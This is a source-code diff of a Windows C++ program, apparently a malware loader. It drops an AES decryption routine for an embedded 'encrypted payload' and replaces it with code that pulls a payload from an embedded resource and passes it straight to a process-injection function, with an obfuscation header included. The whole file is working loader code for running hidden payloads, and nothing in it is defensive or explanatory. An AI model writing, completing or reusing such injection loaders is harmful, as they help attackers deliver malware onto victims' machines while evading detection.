@@ -1,75 +1,45 @@
 #include <windows.h>
-#include <wincrypt.h>
 #include <iostream>
-#include <vector>
 
 #include "../includes/Obfuscate.h"
 #include "../includes/startInjection.h"
-#include "../bin/encryption_key.h" // AES KEY
-#include "../bin/HelloWorldHex.h"  // Encrypted payload
+#include "../includes/Resource.h"  // Include the header for IDR_PAYLOAD
 
 using namespace std;
 
-bool DecryptData(const unsigned char* encryptedData, int encryptedDataSize, unsigned char* key, int keySize, std::vector<unsigned char>& decryptedData) {
-    std::cout << "Starting DecryptData function..." << std::endl;  // Debugging output
-
-    HCRYPTPROV hCryptProv;
-    HCRYPTKEY hKey;
-
-    // Acquire a cryptographic provider context
-    if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
-        std::cerr << "Error in CryptAcquireContext: " << GetLastError() << std::endl;
-        return false;
+// Helper function to load the embedded payload from the resource
+HGLOBAL LoadPayloadResource(DWORD& payloadSize) {
+    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD), RT_RCDATA);
+    if (hResource == NULL) {
+        cerr << "[error] Failed to find payload resource.\n";
+        return NULL;
     }
-    std::cout << "Cryptographic context acquired." << std::endl;
 
-    // Import the AES key
-    HCRYPTKEY hAesKey;
-    if (!CryptImportKey(hCryptProv, key, keySize, 0, 0, &hAesKey)) {
-        std::cerr << "Error in CryptImportKey: " << GetLastError() << std::endl;
-        CryptReleaseContext(hCryptProv, 0);
-        return false;
+    HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
+    if (hLoadedResource == NULL) {
+        cerr << "[error] Failed to load payload resource.\n";
+        return NULL;
     }
-    std::cout << "AES key imported successfully." << std::endl;
 
-    // Prepare the buffer for decrypted data
-    decryptedData.resize(encryptedDataSize);
-    memcpy(decryptedData.data(), encryptedData, encryptedDataSize);
-
-    DWORD decryptedDataSize = encryptedDataSize;
-
-    // Decrypt the data in place
-    if (!CryptDecrypt(hAesKey, 0, TRUE, 0, decryptedData.data(), &decryptedDataSize)) {
-        std::cerr << "Error in CryptDecrypt: " << GetLastError() << std::endl;
-        CryptDestroyKey(hAesKey);
-        CryptReleaseContext(hCryptProv, 0);
-        return false;
-    }
-    std::cout << "Decryption successful." << std::endl;
-
-    // Release resources
-    CryptDestroyKey(hAesKey);
-    CryptReleaseContext(hCryptProv, 0);
-
-    // Adjust the size of decryptedData to the actual size of decrypted content
-    decryptedData.resize(decryptedDataSize);
-    return true;
+    payloadSize = SizeofResource(NULL, hResource);
+    return hLoadedResource;
 }
 
 int main() {
-    std::cout << "Starting main function..." << std::endl;  // Debugging output
-
-    std::vector<unsigned char> decryptedPayload;
-
-    if (DecryptData(encryptedData, encryptedDataLen, key, keyLen, decryptedPayload)) {
-        std::cout << "Decryption successful. Executing payload..." << std::endl;
-
-        // Temporarily comment out startInjection to isolate issues
-        // startInjection(decryptedPayload.data(), decryptedPayload.size());
-    } else {
-        std::cerr << "Decryption failed." << std::endl;
+    DWORD payloadSize;
+    HGLOBAL hPayload = LoadPayloadResource(payloadSize);
+    if (hPayload == NULL) {
+        cerr << "[error] Failed to load payload.\n";
+        return 1;
     }
 
-    std::cout << "Program finished without crashing." << std::endl;
+    // Lock the resource to get a pointer to the payload data
+    LPVOID pPayloadData = LockResource(hPayload);
+    if (pPayloadData == NULL) {
+        cerr << "[error] Failed to lock payload resource.\n";
+        return 1;
+    }
+
+    startInjection(static_cast<unsigned char*>(pPayloadData), payloadSize);
     return 0;
 }
